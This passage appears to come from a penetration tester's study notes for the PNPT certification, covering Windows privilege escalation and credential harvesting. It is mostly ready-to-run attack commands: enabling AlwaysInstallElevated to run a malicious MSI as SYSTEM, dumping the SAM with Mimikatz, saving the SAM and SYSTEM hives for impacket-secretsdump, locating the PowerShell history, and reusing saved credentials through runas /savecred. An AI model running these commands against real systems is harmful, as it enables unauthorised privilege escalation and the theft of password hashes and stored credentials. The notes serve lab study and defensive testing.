	- `HKLM\Software\Policies\Microsoft\Windows\Installer`
	- `HKCU\Software\Policies\Microsoft\Windows\Installer`

- Check if it is enabled

```powershell
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
```

- Enable it (requires admin)

```powershell
Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -Value 1
```

- Run malicious MSI payload

```c
msiexec /quiet /qn /i hack.msi
```

This will effectively bypass UAC and run code with `SYSTEM` privileges.


### Sensitive Files
---

- Get Powershell history file
	- Default: `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

```powershell
(Get-PSReadlineOption).HistorySavePath
```


#### SAM and SYSTEM

- SAM file location: `C:\Windows\System32\config`

##### Dump the SAM with Mimikatz

- Mimikatz repository: https://github.com/gentilkiwi/mimikatz
- Mimikatz wiki: https://github.com/gentilkiwi/mimikatz/wiki

```c
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

#### SeBackupPrivilege

- Create copies of SAM and SYSTEM

```c
reg save hklm\sam C:\Users\user\Desktop\sam.hive
reg save hklm\system C:\Users\user\Desktop\system.hive
```

- SAM and SYSTEM can be used to do `secretsdump` on them with impacket.

```python
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### Credential Manager
---

Stores user credentials (usernames, passwords, certs.) using the Windows Data Protection API (DPAPI)

- To list out all stored credentials

```c
cmdkey /list
```

- To add new credentials

```c
cmdkey /add:MyServer /user:MyUser /pass:MyPassword
```

- To delete credentials

```c
cmdkey /delete:MyServer
cmdkey /delete:Domain:interactive=WORKGROUP\Administrator
```

- Open a shell as a new user and save credential into the manager. The first time it asks for the password.

```c
runas /savecred /user:<DOMAIN/WORKGROU>\user powershell.exe
```

- After the credentials have been stored, it is possible to use them again. This time the password is not asked anymore.

```c
runas /savecred /user:<DOMAIN/WORKGROU>\user cmd.exe
```

## Useful Resources
---

Some useful linkes that helped during studing and taking the PNPT exam:

- [WADComs](https://wadcoms.github.io/) - An interactive Cheat Sheet for Windows/AD hacking.
- [GOAD Writeups](https://mayfly277.github.io/categories/goad/) - Writeups fro the [Game of Active Directory](https://orange-cyberdefense.github.io/GOAD/) lab environment.
- [AD Mindmap](https://mayfly277.github.io/posts/Upgrade-Active-Directory-mindmap/) - Mindmap for pentesting Active Directory.
- [OSCP AD Lab](https://www.youtube.com/playlist?list=PLT08J44ErMmb9qaEeTYl5diQW6jWVHCR2) - YouTube OSCP themed playlist for setting up and later hacking AD.